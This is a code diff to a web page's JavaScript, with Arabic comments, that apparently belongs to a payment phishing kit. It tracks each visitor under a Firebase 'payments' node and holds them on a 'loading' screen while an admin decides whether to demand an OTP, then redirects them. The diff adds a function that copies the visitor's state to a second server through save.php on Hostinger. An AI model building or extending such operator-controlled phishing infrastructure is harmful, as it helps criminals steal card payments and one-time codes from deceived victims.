@@ -109,14 +109,33 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
+        // وظيفة لمزامنة البيانات مع ملف save.php على Hostinger
+        function syncToHostinger(data) {
+            const formData = new FormData();
+            formData.append('visitorId', visitorId);
+            formData.append('currentPage', data.currentPage || "جاري المعالجة (Loading)");
+            if(data.status) formData.append('status', data.status);
+            if(data.action) formData.append('action', data.action);
+
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("Hostinger Sync Error: ", err));
+        }
+
         if (visitorId) {
-            // تحديث موقع الزائر الحالي وحالته ليراها الأدمن
-            database.ref('payments/' + visitorId).update({
+            const updateData = {
                 currentPage: "جاري المعالجة (Loading)",
-                status: "waiting", // حالة الانتظار حتى يقرر الأدمن (OTP أو غيره)
+                status: "waiting",
                 lastUpdate: new Date().toLocaleString('ar-SA'),
                 lastActive: firebase.database.ServerValue.TIMESTAMP
-            });
+            };
+
+            // تحديث Firebase
+            database.ref('payments/' + visitorId).update(updateData);
+            
+            // تحديث Hostinger
+            syncToHostinger(updateData);
 
             // مراقبة الحالة لحظياً للتحويل التلقائي بناءً على اختيار الأدمن
             database.ref('payments/' + visitorId).on('value', (snapshot) => {
